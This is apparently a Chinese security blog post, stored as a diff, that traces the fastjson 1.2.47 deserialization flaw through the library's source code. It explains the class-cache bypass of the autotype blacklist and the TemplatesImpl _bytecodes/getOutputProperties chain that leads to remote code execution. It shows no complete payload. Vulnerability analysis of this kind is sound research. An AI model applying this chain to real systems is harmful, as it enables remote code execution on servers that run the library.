+<p>这边检查了一下type是否是泛型数组类型；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEQ4P"><img src="https://z3.ax1x.com/2021/11/08/IJEQ4P.png" alt="IJEQ4P.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJE19f"><img src="https://z3.ax1x.com/2021/11/08/IJE19f.png" alt="IJE19f.png"></a></p>
+<p>然后又回到DefaultJSONParser类下的parse函数</p>
+<p>然后根据token进入到与其对应的分支之中；最开始因为是<code>&#123;</code>开头，所以设置成了12；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJE338"><img src="https://z3.ax1x.com/2021/11/08/IJE338.png" alt="IJE338.png"></a></p>
+<p>进入praseObject方法进行解析；因为token是12，是字符<code>&#123;</code>，所以过前面的if判断，进入后续解析操作，利用扫描器扫一下看看是不是有一些换行或者其他的特殊符；如果有的话直接调用扫描器的next函数进行跳过；读取下一位当作ch；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IY7F41"><img src="https://z3.ax1x.com/2021/11/09/IY7F41.png" alt="IY7F41.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJE8gS"><img src="https://z3.ax1x.com/2021/11/08/IJE8gS.png" alt="IJE8gS.png"></a></p>
+<p>接着利用扫描器的getCurrent函数拿到当前的ch；如下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJErgU"><img src="https://z3.ax1x.com/2021/11/08/IJErgU.png" alt="IJErgU.png"></a></p>
+<p>拿到ch之后向后判断扫描；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEdNq"><img src="https://z3.ax1x.com/2021/11/08/IJEdNq.png" alt="IJEdNq.png"></a></p>
+<p>然后判断引号成立之后，利用scanSymbol函数拿到当前引号和下一个引号的中间内容；key；</p>
+<p>拿到之后继续向后扫描；并且利用getCurrent函数拿到后续的扫描符号；经过debug可看到如果不是字符<code>:</code>就会抛出错误；意味着我们传入的json必须合规；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEBCV"><img src="https://z3.ax1x.com/2021/11/08/IJEBCV.png" alt="IJEBCV.png"></a></p>
+<p>这里经过debug发现确实是如此；然后根据规则继续向下判断，下一个符号为<code>&#123;</code>；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEw40"><img src="https://z3.ax1x.com/2021/11/08/IJEw40.png" alt="IJEw40.png"></a></p>
+<p>这里经过fastjson的判断发现没有构成一个完整的buckets模式解析；就会继续向后扫描；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJED3T"><img src="https://z3.ax1x.com/2021/11/08/IJED3T.png" alt="IJED3T.png"></a></p>
+<p>在扫描的途中会去判断现在拿到的key是否为<code>@type</code>;这里显然不是；最后再次回调parseObject函数；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEsvF"><img src="https://z3.ax1x.com/2021/11/08/IJEsvF.png" alt="IJEsvF.png"></a></p>
+<p>再次回调和上次的唯一一个区别是，这次是完整的解析拿到了<code>@type</code>字段；并且进入后续的check中；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEcDJ"><img src="https://z3.ax1x.com/2021/11/08/IJEcDJ.png" alt="IJEcDJ.png"></a></p>
+<p>这里有必要提一下，因为没有开启autotype的功能，所以这里的check会先从最开始的fastjson的缓存中进行find类；也就是白名单，如果不存在的话就去进行匹配黑名单，如果匹配到黑名单则抛出error；反之退出；不会进行构造javabean反序列化器的操作；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJE6u4"><img src="https://z3.ax1x.com/2021/11/08/IJE6u4.png" alt="IJE6u4.png"></a></p>
+<p>这里将token设置为16；意味着json合法情况下，下一个符号是逗号；</p>
+<p>根据java.lang.Class类对象，寻找针对java.lang.Class的反序列化器，之所以要找新的反序列化器是为了后续反序列化java.lang.Class的字段。这里自然在deserializers这个mapping中拿到了相应的反序列化解析器；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEgb9"><img src="https://z3.ax1x.com/2021/11/08/IJEgb9.png" alt="IJEgb9.png"></a></p>
+<p>在MiscCodec这个反序列化解析器下，当判断为Class对象的时候会进行loadClass；</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/3c9c8566d83f7bf5.png"></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJEf4x"><img src="https://z3.ax1x.com/2021/11/08/IJEf4x.png" alt="IJEf4x.png"></a></p>
+<p>这里就是问题所在，在进行loadClass的时候将第三个参数cache赋值为true；造成的效果就是当在mapping中无法get到class的时候将class写入mapping；代码如下；这也就是1.2.47中危害的根本点，直接写入缓存，然后二次加载绕过黑名单；<code>autotype 关 ：基本攻击方法是在缓存中攻击或者在白名单中；白名单一般为空；然而开启autotype的时候可以在不触发黑名单的情况下去反序列化任意类；因为fj会去构造javaBean模式的反序列化器去对相应的类进行反序列化处理；</code></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJE4C6"><img src="https://z3.ax1x.com/2021/11/08/IJE4C6.png" alt="IJE4C6.png"></a></p>
+<p>也是因为这个致命的缺点，可以让我们的恶意类逃过check；</p>
+<p>过check之后，就会按照正常的解析流程去拿到反序列化器；找TemplatesImpl.class对应的反序列化器的任务还是委托给config，但是显然config并没有专门对付TemplatesImpl的反序列化器，所以走到了最后一个if条件，即把TemplatesImpl当作一个Java Bean来看并待根据TemplatesImpl实际情况定制一个JavaBeanDeserializer。</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/c669780ec46dd601.png"></p>
+<p>![截屏2021-10-31 下午4.32.20](/Users/s1mple/Desktop/截屏2021-10-31 下午4.32.20.png)</p>
+<h2 id="定制JavaBeanDeserializer来反序列化TemplatesImpl-class"><a href="#定制JavaBeanDeserializer来反序列化TemplatesImpl-class" class="headerlink" title="定制JavaBeanDeserializer来反序列化TemplatesImpl.class"></a>定制JavaBeanDeserializer来反序列化TemplatesImpl.class</h2><p>细看一下TemplatesImpl版的JavaBeanDeserializer定制过程。</p>
+<p>一来先构建一个beaninfo</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/IJE58K"><img src="https://z3.ax1x.com/2021/11/08/IJE58K.png" alt="IJE58K.png"></a></p>
+<p>beaninfo构建的目的主要是拿到TemplatesImpl满足条件的getter、setter对应的Field和无参构造方法。获取这些办法就是常规的内省操作。</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/9bef93bdaeb96e84.png"></p>
+<p>内省重点是满足条件的getter和setter</p>
+<p>获取的首要点就是判断；非静态函数 &amp;&amp; 返回类型为void或当前类 &amp;&amp; 参数个数为1个；有注释或者以set开头；当然这里对于两个参数的方法有相应的处理，要求第一个参数是String类型，第二个参数为Object类型；不过主要还是拿到一个形参的函数；</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/4614a07e20df7a61.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/0fa25ee01504193d.png"></p>
+<p>然后根据相应的javabean规则去匹配相应的属性；</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/c3678d735c7be7d4.png"></p>
+<p>然后如果没有相应的属性值的话就去判断是不是boolean类型，如果是就会变更属性名再去属性列表里寻找，找不到则field参数返回null；propertyName参数还是之前的值；</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/0b32f28779d7c48b.png"></p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/cdf682928461e944.png"></p>
+<p>这里先拿setter；然后属性都过完一遍之后再去内省getter；这里对getter的标准就比较的多；具体的要求我直接贴代码出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; builderClass == <span class="keyword">null</span> &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType()))</span><br></pre></td></tr></table></figure>
+
+<p>方法名长度大于等于4 &amp;&amp; 非静态方法 &amp;&amp; 以get开头且第4个字母为大写 &amp;&amp; 无参数 &amp;&amp; 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/8ef243e1c2ccf87a.png"></p>
+<p>找到getter setter对应的字段后，会把字段名、字段对应的方法、类对象等打包成fieldInfo并add到FieldList中</p>
+<p><img src="https://s3.bmp.ovh/imgs/2021/11/0d0e0d2d2cfb89e2.png"></p>
+<p>最后用内省拿到的各种东西去构建JavaBeanInfo；返回实例化对象；</p>
+<p><img src="https://www.hualigs.cn/image/61893f1420a4b.jpg"></p>
+<p>比较有意思的一个点是在构建javabeaninfo的时候会去对每一个fieldInfo进行判断，当然这个就是最开始在build的时候new的一个点；程序将拿到的属性和相应的方法放进去；这里会进行判断getOnly属性；意思是此属性是否只是有getter没有setter；这个点和一个叫asm的有关；asm是会对fastjson的性能有一定的优化，避免反射导致的开销；</p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/9d13e893d330aa6e.png"></p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/6c27cb81936464fc.png"></p>
+<p>因为存在getOnly类型的方法，所以会掉用JavaBeanDeserializer构造方法；然后会再次把上面说的去拿到setter和getter的操作进行一遍；再此期间fastjson会给每个bean定制反序列化器；</p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/a44828179e725251.png"></p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/429f1752350856fc.png"></p>
+<p>默认是DefaultFieldDeserializer；注意，这里的反序列化器针对的属性只是第二大步中由method中推演出来的几个属性，所以在第三大步对于目标对象属性反序列化的时候无法match到相应Field的deserializer；所以会自动生成拓展的反序列化器，当然这是后面分析的；</p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/ca69c4c39b9dea5c.png"></p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/d907b6496c64ca32.png"></p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/38106d01e42e160b.png"></p>
+<p>然后把每个属性的反序列化器生成之后放在sortedFieldDeserializers里；</p>
+<p>![截屏2021-11-02 下午11.05.09](/Users/s1mple/Desktop/截屏2021-11-02 下午11.05.09.png)</p>
+<p>在最后回到ParserConfig#getDeserializer方法，调用putDeserializer方法，将生成的反序列化器与@type传入的class类进行关联，放入目标类无参构造器，最后返回反序列化器；</p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/9a6a24efacd72d1f.png"></p>
+<p>然后return；至此JavaBeanDeserializer定制完成，然后就是反序列化TemplatesImpl；</p>
+<p>DefaultJSONParser.class 下；</p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/c503a27378980b62.png"></p>
+<h2 id="JavaBeanDeserializer-deserialze"><a href="#JavaBeanDeserializer-deserialze" class="headerlink" title="JavaBeanDeserializer.deserialze"></a>JavaBeanDeserializer.deserialze</h2><p>deserialze往下跟几步会进入label1289，从宏观来看主要的操作都在label1289和其子label中，做了以下这几件事情。</p>
+<ol>
+<li>读取json字符串内容</li>
+<li>创建TemplatesImpl对象</li>
+<li>用字段的反序列化器把读到内容set到TemplatesImpl对象中</li>
+</ol>
+<p>创建TemplatesImpl对象；</p>
+<p><img src="https://b2.kuibu.net/file/imgdisk/imgs/2021/11/be609a1c0f7952d4.png"></p>
+<p>继续scan json之后将后续的值进行反序列化；因为scan json后拿到的key没有match到原本第二大步中method推演的属性；所以if走到最后，这里最后调用parseField对scan的json的key(类属性)进行反序列化；</p>
+<p><img src="https://i.loli.net/2021/11/08/HxLBIu4w1h3t9lG.png" alt="截屏2021-11-07 下午8.51.20.png"></p>
+<p>会先去寻找是否在之前构造有相应key属性的反序列化器；这里最后的结果为null；追溯一下不难发现；</p>
+<p><img src="https://i.loli.net/2021/11/08/nPd7u3xpTFJc2MD.png" alt="截屏2021-11-07 下午8.52.47.png"></p>
+<p>回到parseField方法中，设置Feature.SupportNonPublicField状态，并根据状态值进入if条件判断的代码块中，生成extraFieldDeserializers扩展的反序列化器。再从反序列化器中取出从fastjson获取的json数据中指定的属性。</p>
+<p><img src="https://i.loli.net/2021/11/08/dqXNfzg59VHubGQ.png" alt="截屏2021-11-07 下午10.17.38.png"></p>
+<p><img src="https://i.loli.net/2021/11/08/VyEMr5AoPOJvWYG.png" alt="截屏2021-11-07 下午10.18.42.png"></p>
+<p>然后开始从拓展的反序列化器中get到json中的属性；通过反射进行处理；</p>
+<p><img src="https://i.loli.net/2021/11/08/f4Dp5AyzrBbeTvo.png" alt="截屏2021-11-07 下午10.32.37.png"></p>
+<p>然后调用parseField方法，按照获取deserializer反序列化器的流程，获取fieldValueDeserilizer反序列化器。得到fieldValueDeserilizer反序列化器，在parseField方法中调用deserialze方法进行反序列化。</p>
+<p><img src="https://i.loli.net/2021/11/08/8BfbF2luPEWXGkx.png" alt="截屏2021-11-07 下午10.54.19.png"></p>
+<p>![截屏2021-11-07 下午11.39.02](/Users/s1mple/Desktop/截屏2021-11-07 下午11.39.02.png)</p>
+<p>FieldValueDeserializer反序列化器是调用parseConfig类下的getDeserializer方法；先去config中注册好的反序列化器中查找；</p>
+<p>![截屏2021-11-07 下午11.43.08](/Users/s1mple/Desktop/截屏2021-11-07 下午11.43.08.png)</p>
+<p>这里因为是数组；所以在内部没有注册反序列化器的时候会经过一系列判断；如下图：</p>
+<p>![截屏2021-11-08 上午12.03.30](/Users/s1mple/Desktop/截屏2021-11-08 上午12.03.30.png)</p>
+<p>拿到ObjectArrayCodec反序列化器；</p>
+<p><img src="https://i.loli.net/2021/11/08/w3BejuxQ7TShHWF.png" alt="截屏2021-11-07 下午11.16.09.png"></p>
+<p>继续追踪一下调用栈：</p>
+<p>![截屏2021-11-08 上午12.15.48](/Users/s1mple/Desktop/截屏2021-11-08 上午12.15.48.png)</p>
+<p>DefaultJSONParser.parseArray()；</p>
+<p>因为token被检测出来是 <code>[</code>;    也就是14；所以nexttoken就会设置为15；具体可debug就知道；因为只是看属性，所以随意选择属性点无妨；</p>
+<p><img src="https://i.loli.net/2021/11/08/FJlmwuGNaIoHsAY.png" alt="截屏2021-11-08 上午10.46.13.png"></p>
+<p>![截屏2021-11-08 上午12.26.55](/Users/s1mple/Desktop/截屏2021-11-08 上午12.26.55.png)</p>
+<p>在DefaultJSONParser类下通过lexer.token()方法去调用JSONScanner类下的token方法获得token；判断<code>[]</code>之前数据类型，返回token为4，相应的为string；至此程序拿到的信息是：bytecode是一个数组类型，里面的数据是string类型；然后继续调用DefaultJSONParser下的743行对bytecode进行相应的反序列化；</p>
+<p><img src="https://i.loli.net/2021/11/08/snfa5dgZKMbCwB2.png" alt="截屏2021-11-08 上午11.04.39.png"></p>
+<p><img src="https://i.loli.net/2021/11/08/qsGVCOjLBZDlU4x.png" alt="截屏2021-11-08 上午10.57.15.png"></p>
+<p>调用数组解析器进行解析，因为里面数据为string类型，所以这里将string类型数据当作byte类型来读取；在此期间会进行base64解密，相应的流程可以看以下两个图的debug调试；两个都发生在数组解析器中；ObjectArrayCodec；</p>
+<p><img src="https://i.loli.net/2021/11/08/MkfCEg76PnW92sb.png" alt="截屏2021-11-08 上午11.05.47.png"></p>
+<p><img src="https://i.loli.net/2021/11/08/IsMRdpeDUnocakt.png" alt="截屏2021-11-08 上午11.07.10.png"></p>
+<p>最后返回相应的数据</p>
+<p><img src="https://i.loli.net/2021/11/08/SiVZWqRH9jbJ7zd.png" alt="截屏2021-11-08 上午11.18.03.png"></p>
+<p>并且将其放在new的JSONArray数组里；</p>
+<p>最后利用toObjectArray函数将其打包成对象数组；</p>
+<p><img src="https://i.loli.net/2021/11/08/wRPsNBZDbJo9qjd.png" alt="截屏2021-11-08 上午11.21.21.png"></p>
+<p>最后调用setvalue进行赋值；将对象数组赋值给TemplatesImpl中对应的属性中；</p>
+<p><img src="https://i.loli.net/2021/11/08/YmPQ7HWXO8b29lt.png" alt="截屏2021-11-08 上午11.34.04.png"></p>
+<p>其他的属性都雷同的方法进行反序列化，调用反射进行相应的赋值；但是有一点不同的是，当去反序列化_outputProperties的时候，因为这个属性是getOnly；所以在调用setValue方法反射</p>
+<p><code>FieldDeserializer class下setValue方法；</code>最开始会去利用属性去fieldInfo封装中get到method；但是显然没有相应的method；所以走到最后一步直接set值；</p>
+<p><img src="https://i.loli.net/2021/11/08/EH4m81OqWNhA6gy.png" alt="截屏2021-11-08 下午3.37.51.png"></p>
+<p>但是有趣的是如果get到相应的method就会去进行一系列的if判断，判断是否属于getOnly和其参数类型等等；</p>
+<p>解析_outputProperties的时候，因为在TemplatesImpl对象中可以匹配到相应的方法，这在之前已经打包放在了FieldInfo中；所以此处可以很轻易的从FieldInfo中拿到相应方法，进入getOnly的判断，这里显然是符合getOnly类型的，最后判断其返回值是否是Map的子类，这里不难发现追溯一下；其返回值类的父类继承Map接口；所以符合，然后这里直接通过反射调用getOutputProperties方法；其实这里及时不是Map的子类，也会在后面也进行相应方法的调用；</p>
+<p><img src="https://i.loli.net/2021/11/08/XWVUxgDSKIvjOzm.png" alt="截屏2021-11-08 下午3.52.04.png"></p>
+<p><img src="https://i.loli.net/2021/11/08/OHAKgp7TzPey5jr.png" alt="截屏2021-11-08 下午3.48.01.png"></p>
+<p>到此分析过apache的commonscollections的师傅想来已经明白了。 最后通过getTransletInstance方法下的newInstance进行恶意类加载，这里恶意类追溯下不难发现是在defineTransletClasses方法中由bytecodes倒入的，这也是为什么构造bytecodes去进行给bytecodes赋值的原因；最后效果便是导致攻击者构造的恶意类下static模块的恶意代码执行达到rce；</p>
+<p>最后值得一提的是json数据中同样存在_tfactory属性，但是追溯TemplatesImpl中即没有其getter也没有其setter；但是无伤大雅，我们设置<code>_tfactory</code>为<code>&#123; &#125;</code>,fastjson会调用其无参构造函数得<code>_tfactory</code>对象;这样就避免在defineTransletClasses方法中出现异常退出，如下图所示，让程序不异常退出是从bytecodes中拿到相应恶意类的关键；</p>
+<p><img src="https://i.loli.net/2021/11/08/vyLbPBwYcpiWr7G.png" alt="截屏2021-11-08 下午4.30.28.png"></p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2021/10/02/DOM-Clobbering-%E6%8B%93%E5%B1%95xss%E6%94%BB%E5%87%BB%E9%9D%A2/">
+        DOM Clobbering 拓展xss攻击面 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
